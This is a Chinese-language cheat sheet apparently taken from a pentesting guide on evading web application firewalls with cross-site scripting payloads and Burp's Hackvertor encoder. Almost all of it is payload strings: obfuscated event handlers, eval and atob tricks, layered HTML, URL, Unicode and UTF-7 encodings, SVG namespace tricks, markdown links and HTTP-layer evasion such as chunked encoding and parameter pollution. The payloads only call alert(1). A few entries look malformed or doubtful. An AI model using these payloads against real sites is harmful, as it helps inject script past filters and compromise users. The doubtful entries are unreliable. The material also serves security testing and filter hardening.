## 三、WAF深度绕过与Hackvertor编码矩阵

### 3.1 标签/事件大小写与变体
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
<svg oNloAd=alert(1)>
<ScRiPt sRc=x></ScRiPt>
```

### 3.2 标签内填充垃圾
```html
<img/****/src=x/****/onerror=alert(1)>
<img src=x onerror=alert(1)//////>
<img src=x onooooooooonerror=alert(1)>    (不可识别属性+事件)
<IMG SRC=xonerror=alert(1)>    (缺少空格，某些解析器识别)
<img/src=x onerror=alert(1)>
<img
src=x onerror=alert(1)>       (换行分隔)
<img%09src=x%09onerror=alert(1)>    (Tab)
<img%0asrc=x%0donerror=alert(1)>    (换行符)
```

### 3.3 事件处理程序变形
```html
<!-- 标准事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 自动触发事件 -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 少见事件（绕过WAF黑名单）-->
<svg onload=alert(1)>                    (SVG命名空间专属事件)
<animate onbegin=alert(1) attributeName=x dur=1s>
<set onbegin=alert(1) attributeName=x to=1 dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<body onpointerdown=alert(1)>
<div onwheel=alert(1)>
<details ontoggle=alert(1)>
<input oninput=alert(1)>
<object onerror=alert(1)>
<applet code=xxx onerror=alert(1)>
<vmlframe xmlns=vml onload=alert(1)>

<!-- 事件名变形 -->
<svg/onload=alert(1)>
<svg///onload=alert(1)>
<svg onload%09=alert(1)>
<svg onload%0a=alert(1)>
<svg ONLOAD=alert(1)>

<!-- 事件处理器换行 -->
<img src=x onerror
=alert(1)>
<img src=x onerror=&#10;alert(1)>
```

### 3.4 JavaScript字符串/函数混淆
```javascript
// 字符串拆分
<script>eval('al'+'ert(1)')</script>
<script>eval('al\x65rt(1)')</script>
<script>eval('al\u0065rt(1)')</script>
<script>eval('\141\154\145\162\164(1)')</script>     (八进制)
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

// 函数调用变形
<script>window['alert'](1)</script>
<script>top['alert'](1)</script>
<script>self['alert'](1)</script>
<script>parent['alert'](1)</script>
<script>this['alert'](1)</script>
<script>globalThis['alert'](1)</script>
<script>[].filter.constructor('alert(1)')()</script>
<script>alert.call(null,1)</script>
<script>alert.apply(null,[1])</script>
<script>new (alert)(1)</script>
<script>(alert)(1)</script>
<script>({valueOf:alert})</script>
<script>Function('al'+'ert(1)')()</script>
<script>[].sort.constructor('alert(1)')()</script>

// 利用JS特性绕过括号过滤
<script>alert`1`</script>            (标签模板字符串)
<script>eval`al\ert\`1\``</script>
<script>setTimeout`alert\`1\``</script>
<script>Function`al\ert\`1\```()</script>
<script>location='javascript:alert\x281\x29'</script>

// 正则表达式
<script>location='javascript:/alert(1)/.source'</script>
```

### 3.5 编码绕过
**HTML实体编码（在HTML属性/文本中生效）：**
```html
<!-- 命名实体 -->
&lt;img src=x onerror=alert(1)&gt;

<!-- 十进制实体 -->
<img src=x onerror=&#97;lert(1)>
&#60;img src=x onerror=alert(1)&#62;

<!-- 十六进制实体 -->
<img src=x onerror=&#x61;lert(1)>
&#x3c;img src=x onerror=alert(1)&#x3e;

<!-- 属性中实体编码（on事件内） -->
<a href="&#106;avascript:alert(1)">click</a>
<img src=x onerror="&#97;lert(1)">
```

**Unicode编码：**
```html
<a href="&#x006A;avascript:alert(1)">click</a>
<iframe src="javascript:\u0061lert(1)">
<script>\u0061lert(1)</script>
```

**URL编码：**
```html
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
<img src=x onerror="%61%6c%65%72%74%28%31%29">
```

**多重编码：**
```
%253Cimg%2520src=x%2520onerror=alert(1)%253E     （双重URL编码）
```

**UTF-7编码（IE/老浏览器）：**
```html
+ADw-img src=+ACI-x+ACI- onerror=+ACI-alert(1)+ACI-+AD4-
```

### 3.6 Hackvertor编码矩阵（Burp插件实战）
Hackvertor将编码变换封装为可嵌套标签，核心标签与适用场景：

| Hackvertor标签 | 编码内容 | 适用绕过场景 |
|---------------|---------|-------------|
| `&#x6f;` / `&#111;` | 十六进制/十进制HTML实体 | 属性内on事件、`<a href>`协议混淆 |
| `\u006f` | Unicode转义 | JS字符串上下文 |
| `%6f` | URL编码 | href/src属性、路径注入 |
| `\x6f` | 十六进制转义 | JS字符串 |
| `\141` | 八进制转义 | JS字符串 |
| `\u{d}` | Unicode码点（ES6） | 现代浏览器JS |
| `atob('...')` | Base64 | eval/Function参数 |
| `String.fromCharCode()` | 数字→字符 | 无引号上下文 |
| `\u{74}\u{65}\u{78}\u{74}` 拆分 | 字符级拆分 | 关键字黑名单 |
| 全角字符 | 全角统一 | 归一化不完整的过滤器 |

**嵌套组合示例（Burp Hackvertor语法）：**
```html
<!-- 双层编码：URL编码套HTML实体 -->
<svg onload=&#x61;<@%6c%65%72%74(1)>>  （构造 alert(1) 的混合编码）

<!-- Hackvertor标签组合（Burp内直接使用） -->
<img src=x onerror="&#97;<@\u006c>ert(1)">
```

### 3.7 利用HTML解析器特性
```html
<!-- 无引号属性自动结束 -->
<img src=x onerror=alert(1) <b>
<a href=javascript:alert(1)>click</a>
<a href=javascript:alert(1) id=x>click</a>

<!-- 斜杠代替空格 -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 空字节（老IE）-->
<img src=x onerror=%00alert(1)>

<!-- 全角字符（某些过滤器未归一化）-->
<IMG SRC=X ONERROR=ａｌｅｒｔ（１）>   (全角括号/字符，部分浏览器识别)

<!-- Null字符截断 -->
<scr\0ipt>alert(1)</scr\0ipt>
```

### 3.8 SVG/MathML特殊命名空间
```html
<!-- SVG中script不需要严格闭合 -->
<svg><script>alert(1)</script></svg>
<svg><script>alert(1)<!-- （自动闭合）-->

<!-- SVG中可执行脚本变体 -->
<svg onload=alert(1)>
<svg><g onload=alert(1)>
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>

<!-- SVG foreignObject嵌入HTML -->
<svg><foreignObject width=100 height=100><body xmlns=http://www.w3.org/1999/xhtml onclick=alert(1)></body></foreignObject></svg>

<!-- XML命名空间（.xht/.xml文件或XHTML）-->
<xml:script xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></xml:script>
```

### 3.9 Markdown/XSS组合
```markdown
![x](javascript:alert(1))
[x](javascript:alert(1))
[x](data:text/html,<script>alert(1)</script>)
[a](javascript:alert(1) "title")
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 3.10 HTTP协议层绕过（WAF盲区）
- **Content-Type混淆**：`application/json` / `text/plain` / `application/x-www-form-urlencoded` 切换，部分WAF只解析特定类型
- **HPP（HTTP参数污染）**：`?a=1&a=<script>...` 或 JSON body + URL参数拆分payload
- **分块传输（Chunked）**：`Transfer-Encoding: chunked` 分段，部分WAF不重组
- **HTTPS/Gzip/自定义加密**：避免明文检测
- **multipart/form-data包裹**：部分WAF不解析multipart中的JSON/表单
- **Unicode 归一化攻击（2025新兴）**：利用 NFC/NFKC 归一化差异，发送全角/组合字符变体，过滤器与解析器归一化不一致导致漏检

